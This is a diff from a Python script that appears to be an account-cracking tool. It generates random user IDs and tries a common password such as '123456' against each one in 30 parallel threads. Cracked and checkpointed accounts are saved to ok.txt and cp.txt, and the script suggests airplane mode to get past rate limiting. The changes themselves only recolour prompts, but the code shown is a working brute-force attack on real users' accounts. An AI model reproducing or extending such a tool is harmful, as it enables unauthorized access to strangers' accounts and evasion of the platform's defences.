@@ -174,7 +174,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;92m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -184,15 +184,15 @@ class Main:
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
-				listpass = input("%s \033[1;32m[?] ENTER PASSWORD :%s "%(G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s \033[1;32m[!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s \033[1;32m[*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(R))
-				print("%s\033[1;37m [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
+				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
